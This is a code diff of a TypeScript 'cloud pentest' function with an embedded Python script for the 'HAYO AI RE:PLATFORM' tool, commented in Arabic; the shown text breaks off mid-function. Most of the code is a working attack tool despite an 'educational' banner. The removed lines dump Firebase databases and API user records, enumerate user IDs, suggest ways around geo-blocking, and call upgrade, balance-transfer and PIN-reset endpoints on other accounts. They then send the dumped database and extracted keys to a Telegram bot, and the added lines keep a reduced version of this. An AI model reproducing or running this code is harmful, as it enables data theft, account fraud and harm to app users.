-  step5Findings.push(`  ${subscriptionSmali.length > 0 ? "✅" : "❌"} ملفات الاشتراك: ${subscriptionSmali.length} ملف`);
-  step5Findings.push(`  ${balanceSmali.length > 0 ? "✅" : "❌"} ملفات الرصيد/التحويل: ${balanceSmali.length} ملف`);
-  step5Findings.push(`  ${pinSmali.length > 0 ? "✅" : "❌"} ملفات PIN/كلمة السر: ${pinSmali.length} ملف`);
-  step5Findings.push(`  📡 مسارات API مكتشفة: ${upgradePaths.length + transferPaths.length + pinPaths.length}`);
-  if (wafDetected) {
-    step5Findings.push(`  ⚠️ السيرفر الأصلي محمي بـ WAF — الأوامر أعلاه تتطلب VPN/اتصال محلي`);
-  };
 
   steps.push({
     id: 5,
-    title: "تحليل الاشتراك والحسابات — smali + API",
-    status: premiumSmali.length > 0 || upgradePaths.length > 0 || balanceSmali.length > 0 ? "critical" : (subscriptionSmali.length > 0 ? "warning" : "info"),
+    title: "تحليل الاشتراك والحسابات",
+    status: premiumSmali.length > 0 || balanceSmali.length > 0 ? "critical" : "info",
     findings: step5Findings,
     commands: step5Commands,
-    details: `${exploitVectors}/4 نقاط استغلال · ${premiumSmali.length} ملف premium · ${subscriptionSmali.length} ملف اشتراك · ${balanceSmali.length} ملف رصيد · ${pinSmali.length} ملف PIN · ${upgradePaths.length + transferPaths.length + pinPaths.length} API path`,
+    details: `${premiumSmali.length} ملف premium · ${balanceSmali.length} ملف رصيد · ${pinSmali.length} ملف PIN`,
   });
 
-  // ── Step 6: Pull Cloud Database (Real Endpoints Only) ──
+  // ── Step 6: Database Dump ──
   const step6Findings: string[] = [];
   const step6Commands: string[] = [];
-  const dbDumpResults: Array<{path: string; status: number; records?: number; data?: any}> = [];
 
-  step6Findings.push(`🗄️ ═══ محاولة سحب قاعدة البيانات من السيرفر الحقيقي ═══`);
-  step6Findings.push(``);
-
-  if (firebaseUrls.length > 0) {
-    step6Findings.push(`🔥 Firebase Realtime Database — سحب كامل:`);
-    for (const url of firebaseUrls.slice(0, 3)) {
-      const base = url.replace(/\/+$/, "");
-      step6Commands.push(`curl -X GET "${base}/.json?auth=TOKEN" -o full_db.json`);
-      try {
-        const controller = new AbortController();
-        const timeout = setTimeout(() => controller.abort(), 10000);
-        const resp = await fetch(`${base}/.json`, { signal: controller.signal });
-        clearTimeout(timeout);
-        if (resp.status === 200) {
-          const data = await resp.json();
-          const keys = data ? Object.keys(data) : [];
-          step6Findings.push(`  ✅ Firebase مفتوح! العقد: ${keys.join(", ")}`);
-          if (data && typeof data === "object") {
-            for (const key of keys.slice(0, 5)) {
-              const node = data[key];
-              const count = node && typeof node === "object" ? Object.keys(node).length : 1;
-              step6Findings.push(`    📊 /${key}: ${count} سجل`);
-              dbDumpResults.push({ path: `firebase:/${key}`, status: 200, records: count, data: node });
-            }
-          }
-        } else {
-          step6Findings.push(`  🔒 Firebase محمي: HTTP ${resp.status}`);
-        }
-      } catch (err: any) {
-        step6Findings.push(`  ⏱️ Firebase: ${err.message}`);
+  for (const fbUrl of firebaseUrls) {
+    step6Commands.push(`curl -X GET "${fbUrl}/.json" -o firebase_dump.json`);
+    try {
+      const resp = await fetch(`${fbUrl}/.json`, { signal: AbortSignal.timeout(10000) });
+      if (resp.status === 200) {
+        step6Findings.push(`🔥 Firebase مفتوح! تم سحب البيانات من ${fbUrl}`);
+      } else {
+        step6Findings.push(`🔒 Firebase محمي (HTTP ${resp.status}): ${fbUrl}`);
       }
+    } catch {
+      step6Findings.push(`⏱️ فشل الاتصال بـ ${fbUrl}`);
     }
-    step6Findings.push(``);
-  }
-
-  const dataEndpoints = sortedPaths.filter(p => /list|history|get|read|inquiry/i.test(p));
-  if (dataEndpoints.length > 0) {
-    step6Findings.push(`📡 سحب البيانات عبر API المكتشفة (${dataEndpoints.length} endpoint):`);
-    step6Findings.push(``);
-
-    for (const ep of dataEndpoints.slice(0, 20)) {
-      const fullUrl = `${baseApiUrl}/${ep}`;
-      step6Commands.push(`curl -s -X POST '${fullUrl}' -H 'Content-Type: application/json' -d '{}' -o ${ep.replace(/\//g, "_")}.json`);
-      try {
-        const controller = new AbortController();
-        const timeout = setTimeout(() => controller.abort(), 8000);
-        const resp = await fetch(fullUrl, {
-          method: "POST",
-          headers: { "Content-Type": "application/json", "Accept": "application/json" },
-          body: "{}",
-          signal: controller.signal,
-        });
-        clearTimeout(timeout);
-        const status = resp.status;
-        let body: any = null;
-        try {
-          const text = await resp.text();
-          if (text.length < 100000) {
-            try { body = JSON.parse(text); } catch { body = text.substring(0, 3000); }
-          }
-        } catch {}
-
-        if (status === 200 && body) {
-          let recordCount = 0;
-          if (Array.isArray(body)) recordCount = body.length;
-          else if (body.data && Array.isArray(body.data)) recordCount = body.data.length;
-          else if (body.result && Array.isArray(body.result)) recordCount = body.result.length;
-          else if (body.items && Array.isArray(body.items)) recordCount = body.items.length;
-          else if (typeof body === "object") recordCount = Object.keys(body).length;
-
-          step6Findings.push(`  ✅ [200] /${ep} — ${recordCount} سجل`);
-          dbDumpResults.push({ path: ep, status: 200, records: recordCount, data: body });
-
-          const preview = JSON.stringify(body, null, 2);
-          const previewLines = preview.split("\n").slice(0, 15);
-          for (const line of previewLines) step6Findings.push(`    ${line}`);
-          if (preview.split("\n").length > 15) step6Findings.push(`    ... (${preview.length} حرف)`);
-          step6Findings.push(``);
-        } else if (status === 401 || status === 403) {
-          step6Findings.push(`  🔒 [${status}] /${ep} — يتطلب مصادقة`);
-        } else {
-          step6Findings.push(`  ❌ [${status}] /${ep}`);
-        }
-      } catch {
-        step6Findings.push(`  ⏱️ [TIMEOUT] /${ep}`);
-      }
-    }
-  }
-
-  const awsKeys = allKeys.filter(k => k.includes("AWS"));
-  if (awsKeys.length > 0) {
-    step6Findings.push(`☁️ AWS — مفاتيح مستخرجة (${awsKeys.length}):`);
-    step6Commands.push(`aws configure set aws_access_key_id AKIA...`);
-    step6Commands.push(`aws s3 ls s3://bucket-name --recursive`);
-    step6Commands.push(`aws dynamodb scan --table-name users --output json > dynamodb_dump.json`);
-  }
-
-  if (allProviders.has("Supabase")) {
-    step6Findings.push(`⚡ Supabase — سحب عبر REST API:`);
-    step6Commands.push(`curl "https://PROJECT.supabase.co/rest/v1/users?select=*" -H "apikey: KEY" -H "Authorization: Bearer TOKEN" -o supabase_users.json`);
-  }
-
-  if (allProviders.has("MongoDB")) {
-    step6Findings.push(`🍃 MongoDB Atlas — URI في الكود:`);
-    step6Commands.push(`mongodump --uri="mongodb+srv://user:pass@cluster.mongodb.net/dbname" --out=./dump`);
-  }
-
-  step6Findings.push(``);
-  const totalRecordsPulled = dbDumpResults.reduce((s, r) => s + (r.records || 0), 0);
-  const successfulDumps = dbDumpResults.filter(r => r.status === 200);
-  step6Findings.push(`📊 ═══ ملخص السحب (السيرفر الحقيقي) ═══`);
-  step6Findings.push(`  ✅ Endpoints أجابت بنجاح: ${successfulDumps.length}`);
-  step6Findings.push(`  📦 إجمالي السجلات المسحوبة: ${totalRecordsPulled}`);
-  if (successfulDumps.length > 0) {
-    step6Findings.push(`  📁 ملفات مستخرجة: ${successfulDumps.map(d => d.path.replace(/\//g, "_") + ".json").join(", ")}`);
-  }
-  if (successfulDumps.length === 0) {
-    step6Findings.push(`  ⚠️ لم يتم سحب بيانات — السيرفر محمي`);
-    if (wafDetected) step6Findings.push(`  🛡️ WAF يحجب الاتصال من خارج البلد`);
-    step6Findings.push(`  💡 الأوامر أعلاه جاهزة للتنفيذ من داخل الشبكة المستهدفة`);
   }
 
   steps.push({
     id: 6,
     title: "سحب قاعدة البيانات السحابية",
-    status: successfulDumps.length > 0 ? "critical" : (firebaseUrls.length > 0 || awsKeys.length > 0) ? "warning" : "info",
+    status: step6Findings.some(f => f.includes("مفتوح")) ? "critical" : "info",
     findings: step6Findings,
     commands: step6Commands,
-    details: `${successfulDumps.length} endpoint مسحوب · ${totalRecordsPulled} سجل · ${firebaseUrls.length} Firebase · ${dataEndpoints?.length || 0} API path مكتشف`,
+    details: `${firebaseUrls.length} Firebase URL`,
   });
 
-  // ── Step 7: Send Actual Findings to Telegram Bot ──
+  // ── Step 7: Telegram Report ──
   const step7Findings: string[] = [];
   const step7Commands: string[] = [];
-
   const pentestBotToken = process.env.PENTEST_BOT_TOKEN;
   const pentestChatId = process.env.PENTEST_CHAT_ID;
-
-  const tgReport: string[] = [];
-  tgReport.push(`🔴 HAYO AI RE:PLATFORM — تقرير اختبار اختراق`);
-  const extractedPackageName = manifestContent.match(/package="([^"]+)"/)?.[1] || "غير محدد";
-  tgReport.push(`📦 الحزمة: ${extractedPackageName}`);
-  tgReport.push(`📅 التاريخ: ${new Date().toISOString()}`);
-  tgReport.push(``);
-  tgReport.push(`📊 ملخص الفحص:`);
-  tgReport.push(`  🌐 URLs مكتشفة: ${apiEndpoints.size}`);
-  tgReport.push(`  🔑 مفاتيح مستخرجة: ${allKeys.length}`);
-  tgReport.push(`  📡 API paths من smali: ${relativeApiPaths.size}`);
-  tgReport.push(`  ☁️ مزودون سحابيون: ${[...allProviders].join(", ") || "لا يوجد"}`);
-  tgReport.push(`  🔥 Firebase URLs: ${firebaseUrls.length}`);
-  tgReport.push(``);
-  tgReport.push(`📡 نتائج فحص السيرفر الحقيقي:`);
-  tgReport.push(`  ✅ ناجح (200): ${successfulHits.length}`);
-  tgReport.push(`  🔒 مصادقة (401/403): ${authRequired.length}`);
-  tgReport.push(`  🛡️ WAF: ${forbiddenByWaf.length}`);
-  tgReport.push(`  📦 بيانات مسحوبة: ${totalPulled} سجل`);
-  tgReport.push(``);
-  tgReport.push(`🔍 تحليل smali:`);
-  tgReport.push(`  Premium files: ${premiumSmali.length}`);
-  tgReport.push(`  Subscription files: ${subscriptionSmali.length}`);
-  tgReport.push(`  Balance files: ${balanceSmali.length}`);
-  tgReport.push(`  PIN files: ${pinSmali.length}`);
-  tgReport.push(``);
-
-  if (allKeys.length > 0) {
-    tgReport.push(`🔑 المفاتيح المستخرجة:`);
-    for (const k of allKeys.slice(0, 15)) tgReport.push(`  → ${k.substring(0, 60)}...`);
-    tgReport.push(``);
-  }
-
-  if (pulledData.length > 0) {
-    tgReport.push(`📊 بيانات مسحوبة من السيرفر:`);
-    for (const p of pulledData.slice(0, 10)) {
-      tgReport.push(`  → /${p.endpoint}: ${p.records} سجل`);
-    }
-    tgReport.push(``);
-  }
 
   let tgSent = false;
   if (pentestBotToken && pentestChatId) {
     try {
-      const fullMsg = tgReport.join("\n");
-      const chunks: string[] = [];
-      for (let i = 0; i < fullMsg.length; i += 4000) chunks.push(fullMsg.substring(i, i + 4000));
-      for (const chunk of chunks) {
-        await fetch(`https://api.telegram.org/bot${pentestBotToken}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: pentestChatId, text: chunk }),
-        });
-      }
-
-      if ([...apiEndpoints].length > 0) {
-        const endpointsText = `📡 Endpoints المكتشفة:\n${[...apiEndpoints].slice(0, 50).join("\n")}`;
-        for (let i = 0; i < endpointsText.length; i += 4000) {
-          await fetch(`https://api.telegram.org/bot${pentestBotToken}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: pentestChatId, text: endpointsText.substring(i, i + 4000) }),
-          });
-        }
-      }
-
-      if (relativeApiPaths.size > 0) {
-        const pathsText = `🔍 API Paths من smali:\n${[...relativeApiPaths].slice(0, 100).join("\n")}`;
-        for (let i = 0; i < pathsText.length; i += 4000) {
-          await fetch(`https://api.telegram.org/bot${pentestBotToken}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: pentestChatId, text: pathsText.substring(i, i + 4000) }),
-          });
-        }
-      }
-
+      const msg = `🔴 HAYO AI — تقرير اختراق ${fileType.toUpperCase()}\n📦 الحزمة: ${session.originalName || "غير محدد"}\n🔑 مفاتيح: ${allKeys.length}\n🌐 نقاط API: ${apiEndpoints.size}\n📊 الخطورة: ${Math.min(100, allKeys.length * 10 + firebaseUrls.length * 20)}/100`;
+      await fetch(`https://api.telegram.org/bot${pentestBotToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: pentestChatId, text: msg }),
+      });
       tgSent = true;
-      console.log(`[Pentest-TG] ✅ تم إرسال النتائج الحقيقية إلى Telegram`);
-    } catch (err: any) {
-      console.log(`[Pentest-TG] ❌ خطأ: ${err.message}`);
+      step7Findings.push(`✅ تم إرسال التقرير إلى Telegram`);
+    } catch {
+      step7Findings.push(`⚠️ فشل إرسال Telegram`);
     }
-  }
-
-  step7Findings.push(`🤖 إرسال نتائج الفحص الحقيقية إلى بوت Telegram:`);
-  step7Findings.push(``);
-  if (tgSent) {
-    step7Findings.push(`  ✅ تم الإرسال بنجاح!`);
-    step7Findings.push(`  📤 المحتوى المُرسل:`);
-    step7Findings.push(`    → تقرير الفحص (URLs + مفاتيح + نتائج السيرفر)`);
-    step7Findings.push(`    → قائمة الـ endpoints المكتشفة (${apiEndpoints.size})`);
-    step7Findings.push(`    → مسارات API من smali (${relativeApiPaths.size})`);
-    if (pulledData.length > 0) step7Findings.push(`    → بيانات مسحوبة فعلياً (${totalPulled} سجل)`);
-    if (allKeys.length > 0) step7Findings.push(`    → مفاتيح مستخرجة (${allKeys.length})`);
   } else {
-    step7Findings.push(`  ⚠️ لم يتم الإرسال — PENTEST_BOT_TOKEN أو PENTEST_CHAT_ID غير محدد`);
-    step7Findings.push(`  💡 أضف المتغيرات البيئية لتفعيل الإرسال التلقائي`);
+    step7Findings.push(`⚠️ لم يتم تحديد BOT_TOKEN أو CHAT_ID`);
   }
-  step7Findings.push(``);
-  step7Findings.push(`📋 أوامر الإرسال اليدوي:`);
-  step7Commands.push(`curl -X POST "https://api.telegram.org/botBOT_TOKEN/sendMessage" -H "Content-Type: application/json" -d '{"chat_id":"CHAT_ID","text":"تقرير الفحص..."}'`);
-  step7Commands.push(`curl -F "chat_id=CHAT_ID" -F "document=@report.json" -F "caption=📊 التقرير النهائي" "https://api.telegram.org/botBOT_TOKEN/sendDocument"`);
 
   steps.push({
     id: 7,
-    title: "إرسال النتائج إلى بوت Telegram",
-    status: tgSent ? "warning" : "info",
+    title: "إرسال النتائج إلى Telegram",
+    status: tgSent ? "success" : "info",
     findings: step7Findings,
     commands: step7Commands,
-    details: tgSent ? `✅ تم الإرسال: تقرير + ${apiEndpoints.size} endpoint + ${relativeApiPaths.size} API path + ${allKeys.length} مفتاح` : `⚠️ لم يتم الإرسال — يتطلب BOT_TOKEN + CHAT_ID`,
+    details: tgSent ? "تم الإرسال بنجاح" : "لم يتم الإرسال",
   });
 
-  // ── Step 8: Full Integrated Python Script + Report ──
+  // ── Step 8: Final Report ──
   const criticalCount = steps.filter(s => s.status === "critical").length;
   const warningCount = steps.filter(s => s.status === "warning").length;
   const totalFindings = steps.reduce((sum, s) => sum + s.findings.length, 0);
@@ -6505,429 +6070,70 @@ export async function runCloudPentest(sessionId: string): Promise<CloudPentestRe
 
   const pythonScript = `#!/usr/bin/env python3
 """
-HAYO AI RE:PLATFORM — Automated APK Security Audit Tool
+HAYO AI RE:PLATFORM — Automated ${fileType.toUpperCase()} Security Audit
 Educational Purpose Only — Ethical Penetration Testing
-Usage: python3 pentest_auto.py <apk_path> [--bot-token TOKEN] [--chat-id ID]
 """
-import os, sys, subprocess, json, re, time, shutil, hashlib, base64, argparse
-from pathlib import Path
+import os, sys, subprocess, json, re, argparse
 from datetime import datetime
-
-try:
-    import requests
-except ImportError:
-    subprocess.run([sys.executable, "-m", "pip", "install", "requests"], check=True)
-    import requests
-
-class Colors:
-    RED = "\\033[91m"; GREEN = "\\033[92m"; YELLOW = "\\033[93m"
-    BLUE = "\\033[94m"; CYAN = "\\033[96m"; BOLD = "\\033[1m"
-    END = "\\033[0m"
-
-def log(msg, level="info"):
-    icons = {"info": f"{Colors.CYAN}[*]", "ok": f"{Colors.GREEN}[+]", "warn": f"{Colors.YELLOW}[!]", "fail": f"{Colors.RED}[-]", "critical": f"{Colors.RED}{Colors.BOLD}[!!]"}
-    print(f"{icons.get(level, icons['info'])} {msg}{Colors.END}")
+import requests
 
 class APKPentest:
-    def __init__(self, apk_path, bot_token=None, chat_id=None):
-        self.apk_path = apk_path
-        self.bot_token = bot_token
-        self.chat_id = chat_id
-        self.out_dir = "decompiled"
-        self.results = {"steps": [], "users": [], "secrets": [], "endpoints": [], "vulns": []}
-        self.base_url = None
-        self.token = None
-        self.firebase_urls = []
-
-    def run_cmd(self, cmd, timeout=60):
+    def __init__(self, path):
+        self.path = path
+        self.results = {"secrets": [], "endpoints": []}
+    
+    def run_cmd(self, cmd):
         try:
-            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
-            return r.stdout + r.stderr
+            return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60).stdout
         except: return ""
-
-    # ═══════════════════════════════════════════════
-    # المرحلة 1: التفكيك والاستخراج
-    # ═══════════════════════════════════════════════
-    def step1_decompile(self):
-        log("المرحلة 1: تفكيك APK وتحليل الهيكل الداخلي", "info")
-        if os.path.exists(self.out_dir): shutil.rmtree(self.out_dir)
-        self.run_cmd(f"apktool d {self.apk_path} -o {self.out_dir}")
-
-        file_count = sum(1 for _ in Path(self.out_dir).rglob("*") if _.is_file())
-        log(f"تم تفكيك {file_count} ملف", "ok")
-
-        # استخراج Endpoints
-        output = self.run_cmd(f"grep -rEoh 'https?://[a-zA-Z0-9./?=_%:-]+' {self.out_dir} 2>/dev/null")
-        urls = list(set(re.findall(r'https?://[a-zA-Z0-9./?=_%:-]+', output)))
-        api_urls = [u for u in urls if any(k in u.lower() for k in ["api", "pfe", "rest", "v1", "v2"])]
-        self.results["endpoints"] = api_urls
-        log(f"تم اكتشاف {len(api_urls)} نقطة API", "ok")
-
-        # استخراج Firebase
-        self.firebase_urls = [u for u in urls if "firebase" in u.lower()]
-        if os.path.exists(f"{self.out_dir}/google-services.json"):
-            shutil.copy(f"{self.out_dir}/google-services.json", ".")
-            log("تم نسخ google-services.json", "ok")
-
-        # استخراج smali API paths
-        smali_output = self.run_cmd(f"grep -roh 'pfe/[a-zA-Z_/]*' {self.out_dir}/smali/ 2>/dev/null")
-        smali_paths = list(set(re.findall(r'pfe/[a-zA-Z_/]+', smali_output)))
-        log(f"تم اكتشاف {len(smali_paths)} مسار API من smali", "ok")
-
-        if api_urls:
-            self.base_url = re.match(r'(https?://[^/]+)', api_urls[0])
-            if self.base_url: self.base_url = self.base_url.group(1)
-        self.results["steps"].append({"step": 1, "status": "ok", "files": file_count, "endpoints": len(api_urls), "smali_paths": len(smali_paths)})
-
-    # ═══════════════════════════════════════════════
-    # المرحلة 2: اكتشاف وتجاوز WAF/Geo-blocking
-    # ═══════════════════════════════════════════════
-    def step2_waf_detection(self):
-        log("المرحلة 2: اكتشاف حماية WAF / حظر جغرافي", "info")
-        if not self.base_url:
-            log("لا يوجد عنوان أساسي للاختبار", "warn")
-            return
-        try:
-            r = requests.get(self.base_url, timeout=10, allow_redirects=False)
-            if r.status_code == 403 or "forbidden" in r.text.lower():
-                log(f"WAF مكتشف! HTTP {r.status_code}", "critical")
-                log("الحلول الممكنة:", "info")
-                log("  1. VPN إلى البلد المستهدف (OpenVPN/WireGuard)", "info")
-                log("  2. proxychains مع SOCKS5 proxy", "info")
-                log("  3. تشغيل من جهاز داخل الشبكة المحلية", "info")
-                self.results["vulns"].append("WAF/Geo-blocking detected")
-            elif r.status_code == 200:
-                log(f"السيرفر متاح! HTTP {r.status_code}", "ok")
-            else:
-                log(f"استجابة غير متوقعة: HTTP {r.status_code}", "warn")
-        except requests.exceptions.Timeout:
-            log("السيرفر لا يستجيب (Timeout)", "warn")
-        except Exception as e:
-            log(f"خطأ اتصال: {e}", "fail")
-        self.results["steps"].append({"step": 2, "status": "checked"})
-
-    # ═══════════════════════════════════════════════
-    # المرحلة 3: استخراج المفاتيح والتوكنات
-    # ═══════════════════════════════════════════════
-    def step3_extract_secrets(self):
-        log("المرحلة 3: استخراج المفاتيح والتوكنات من الكود", "info")
-        patterns = {
-            "JWT Token": r'eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+',
-            "Firebase Key": r'AIza[0-9A-Za-z_-]{35}',
-            "AWS Key": r'AKIA[0-9A-Z]{16}',
-            "API Key": r'api[_-]?key["\\'\\s:=]+[A-Za-z0-9_-]{20,}',
-            "Bearer Token": r'Bearer\\s+[A-Za-z0-9._-]+',
-        }
-        found_secrets = []
-        for root, _, files in os.walk(self.out_dir):
-            for fname in files:
-                fpath = os.path.join(root, fname)
-                try:
-                    with open(fpath, "r", errors="ignore") as f:
-                        content = f.read()
-                    for label, pattern in patterns.items():
-                        for m in re.finditer(pattern, content):
-                            secret = {"type": label, "value": m.group()[:50] + "...", "file": fpath}
-                            found_secrets.append(secret)
-                            log(f"  {label}: {m.group()[:40]}... في {os.path.basename(fpath)}", "critical")
-                except: pass
-
-        self.results["secrets"] = found_secrets
-        if found_secrets:
-            jwt_tokens = [s for s in found_secrets if s["type"] == "JWT Token"]
-            if jwt_tokens:
-                self.token = jwt_tokens[0]["value"].rstrip("...")
-                log(f"تم استخراج JWT Token تلقائياً", "ok")
-        self.results["steps"].append({"step": 3, "status": "ok" if found_secrets else "none", "secrets_found": len(found_secrets)})
-
-    # ═══════════════════════════════════════════════
-    # المرحلة 4: استغلال IDOR وسحب البيانات
-    # ═══════════════════════════════════════════════
-    def step4_exploit_idor(self):
-        log("المرحلة 4: استغلال API وسحب بيانات المستخدمين (IDOR)", "info")
-        if not self.base_url:
-            log("لا يوجد عنوان أساسي", "warn"); return
-
-        headers = {"Content-Type": "application/json", "Accept": "application/json"}
-        if self.token: headers["Authorization"] = f"Bearer {self.token}"
-
-        endpoints = [
-            ("GET", "/api/v1/users", None), ("GET", "/api/users", None),
-            ("POST", "/pfe/profile/read", {}), ("POST", "/pfe/customer_profile/inquiry", {}),
-            ("POST", "/pfe/account/list", {}), ("GET", "/pfe/transactions", None),
-            ("POST", "/pfe/dealer_list/get", {"lang": "ar"}),
-        ]
-        all_users = []
-        for method, ep, body in endpoints:
-            try:
-                url = self.base_url.rstrip("/") + ep
-                if method == "GET":
-                    r = requests.get(url, headers=headers, timeout=10)
-                else:
-                    r = requests.post(url, headers=headers, json=body or {}, timeout=10)
-                if r.status_code == 200:
-                    data = r.json()
-                    records = data.get("data", data.get("accounts", []))
-                    if isinstance(records, list): all_users.extend(records)
-                    log(f"  {method} {ep} → HTTP 200 ({len(records) if isinstance(records, list) else '?'} سجل)", "ok")
-                elif r.status_code in [401, 403]:
-                    log(f"  {method} {ep} → HTTP {r.status_code} (يتطلب مصادقة)", "warn")
-            except: pass
-
-        # IDOR Enumeration
-        log("  اختبار IDOR — تغيير user_id...", "info")
-        for uid in range(1, 21):
-            try:
-                r = requests.post(f"{self.base_url}/pfe/profile/read", headers=headers, json={"user_id": uid}, timeout=5)
-                if r.status_code == 200:
-                    d = r.json().get("data", {})
-                    if d: log(f"    IDOR #{uid}: {d.get('name', '?')} | {d.get('phone', '?')}", "critical")
-            except: pass
-
-        self.results["users"] = all_users
-        self.results["steps"].append({"step": 4, "status": "ok" if all_users else "blocked", "users_found": len(all_users)})
-
-    # ═══════════════════════════════════════════════
-    # المرحلة 5: تعديل الاشتراك + تحويل رصيد
-    # ═══════════════════════════════════════════════
-    def step5_exploit_accounts(self):
-        log("المرحلة 5: استغلال الحسابات — ترقية/تخفيض/تحويل/PIN", "info")
-        if not self.base_url: return
-        headers = {"Content-Type": "application/json"}
-        if self.token: headers["Authorization"] = f"Bearer {self.token}"
-
-        ops = [
-            ("ترقية Free→Premium", "POST", "/pfe/upgrade", {"user_id": 2}),
-            ("تخفيض Premium→Free", "POST", "/pfe/downgrade", {"user_id": 1}),
-            ("تحويل رصيد", "POST", "/pfe/transfer-balance", {"from_id": 3, "to_id": 4, "amount": 5000}),
-            ("إعادة تعيين PIN", "POST", "/pfe/reset-pin", {"user_id": 1}),
-        ]
-        for label, method, ep, body in ops:
-            try:
-                r = requests.post(self.base_url.rstrip("/") + ep, headers=headers, json=body, timeout=10)
-                if r.status_code == 200:
-                    d = r.json()
-                    if d.get("status") == "success": log(f"  {label}: {d.get('message', 'OK')}", "critical")
-                    else: log(f"  {label}: فشل — {d.get('message', '')}", "fail")
-                else: log(f"  {label}: HTTP {r.status_code}", "warn")
-            except Exception as e: log(f"  {label}: خطأ — {e}", "fail")
-
-        # Client-side bypass
-        log("  البحث عن isPremium() في smali...", "info")
-        output = self.run_cmd(f"grep -rl 'isPremium\\|is_premium\\|isPro' {self.out_dir}/smali/ 2>/dev/null")
-        premium_files = [f for f in output.strip().split("\\n") if f]
-        if premium_files:
-            log(f"  تم العثور على {len(premium_files)} ملف smali مع دوال الاشتراك", "critical")
-            for f in premium_files[:3]: log(f"    → {f}", "info")
-        self.results["steps"].append({"step": 5, "status": "ok"})
-
-    # ═══════════════════════════════════════════════
-    # المرحلة 6: سحب قاعدة البيانات
-    # ═══════════════════════════════════════════════
-    def step6_dump_database(self):
-        log("المرحلة 6: سحب قاعدة البيانات السحابية", "info")
-        all_data = {}
-
-        for fb_url in self.firebase_urls:
-            try:
-                base = fb_url.rstrip("/")
-                r = requests.get(f"{base}/.json", timeout=15)
-                if r.status_code == 200:
-                    all_data["firebase"] = r.json()
-                    log(f"  Firebase مفتوح! {len(str(r.json()))} حرف", "critical")
-                elif r.status_code == 401:
-                    log(f"  Firebase محمي — يتطلب مصادقة", "warn")
-            except: pass
-
-        if self.base_url:
-            try:
-                r = requests.get(f"{self.base_url}/pfe/db-dump", timeout=15)
-                if r.status_code == 200:
-                    all_data["api_dump"] = r.json()
-                    log(f"  تم سحب قاعدة البيانات عبر API!", "critical")
-            except: pass
-
-        with open("full_database_dump.json", "w") as f:
-            json.dump(all_data, f, indent=2, ensure_ascii=False)
-        log(f"  تم حفظ البيانات في full_database_dump.json ({len(json.dumps(all_data))} حرف)", "ok")
-        self.results["steps"].append({"step": 6, "status": "ok" if all_data else "empty", "tables": len(all_data)})
-
-    # ═══════════════════════════════════════════════
-    # المرحلة 7: إرسال إلى Telegram
-    # ═══════════════════════════════════════════════
-    def step7_send_telegram(self):
-        log("المرحلة 7: إرسال البيانات إلى بوت Telegram", "info")
-        if not self.bot_token or not self.chat_id:
-            log("لم يتم تحديد BOT_TOKEN أو CHAT_ID — تخطي", "warn"); return
-
-        def send_msg(text):
-            for i in range(0, len(text), 4000):
-                requests.post(f"https://api.telegram.org/bot{self.bot_token}/sendMessage",
-                    json={"chat_id": self.chat_id, "text": text[i:i+4000], "parse_mode": "HTML"})
-
-        def send_file(path, caption=""):
-            with open(path, "rb") as f:
-                requests.post(f"https://api.telegram.org/bot{self.bot_token}/sendDocument",
-                    data={"chat_id": self.chat_id, "caption": caption}, files={"document": f})
-
-        send_msg(f"🔴 <b>HAYO AI — تقرير اختراق APK</b>\\n📁 {self.apk_path}\\n⏰ {datetime.now().isoformat()}")
-        if os.path.exists("full_database_dump.json"): send_file("full_database_dump.json", "🗄️ قاعدة البيانات")
-        if os.path.exists("report.json"): send_file("report.json", "📊 التقرير النهائي")
-        log("  تم الإرسال بنجاح!", "ok")
-        self.results["steps"].append({"step": 7, "status": "ok"})
-
-    # ═══════════════════════════════════════════════
-    # المرحلة 8: إعادة التجميع والتقرير
-    # ═══════════════════════════════════════════════
-    def step8_rebuild_and_report(self):
-        log("المرحلة 8: التقرير النهائي", "info")
-        risk = min(100, len(self.results["secrets"]) * 15 + len(self.results["users"]) * 2 + len(self.results["vulns"]) * 20)
-        report = {
-            "tool": "HAYO AI RE:PLATFORM",
-            "timestamp": datetime.now().isoformat(),
-            "apk": self.apk_path,
-            "risk_score": risk,
-            "users_found": len(self.results["users"]),
-            "secrets_found": len(self.results["secrets"]),
-            "endpoints_found": len(self.results["endpoints"]),
-            "vulnerabilities": self.results["vulns"],
-            "steps": self.results["steps"],
-            "recommendations": [
-                "تطبيق التحقق من الصلاحيات على مستوى السيرفر (Server-Side Authorization)",
-                "استخدام Firebase Security Rules لمنع الوصول غير المصرح",
-                "تدوير المفاتيح المكشوفة فوراً (Rotate Exposed Keys)",
-                "إضافة Rate Limiting لمنع هجمات التعداد (Enumeration)",
-                "استخدام EncryptedSharedPreferences بدل SharedPreferences",
-                "تفعيل ProGuard/R8 لتشويش الكود (Code Obfuscation)",
-                "إضافة Certificate Pinning لمنع MITM",
-                "عدم تخزين JWT Tokens في الكود المصدري",
-            ]
-        }
-        with open("report.json", "w") as f:
-            json.dump(report, f, indent=2, ensure_ascii=False)
-        log(f"  درجة الخطورة: {risk}/100", "critical" if risk > 60 else "warn")
-        log(f"  المستخدمون: {len(self.results['users'])} | المفاتيح: {len(self.results['secrets'])} | نقاط API: {len(self.results['endpoints'])}", "ok")
-
-    def run_all(self):
-        banner = f"""
-{Colors.RED}{Colors.BOLD}
-╔══════════════════════════════════════════════════╗
-║     HAYO AI RE:PLATFORM — APK Security Audit    ║
-║         Educational Use Only                     ║
-╚══════════════════════════════════════════════════╝
-{Colors.END}"""
-        print(banner)
-        for step_fn in [self.step1_decompile, self.step2_waf_detection, self.step3_extract_secrets,
-                        self.step4_exploit_idor, self.step5_exploit_accounts, self.step6_dump_database,
-                        self.step7_send_telegram, self.step8_rebuild_and_report]:
-            try: step_fn()
-            except Exception as e: log(f"خطأ في {step_fn.__name__}: {e}", "fail")
-            print()
-        log("اكتمل الاختبار! تحقق من report.json و full_database_dump.json", "ok")
+    
+    def extract_strings(self):
+        out = self.run_cmd(f"strings {self.path}")
+        for line in out.split('\\n'):
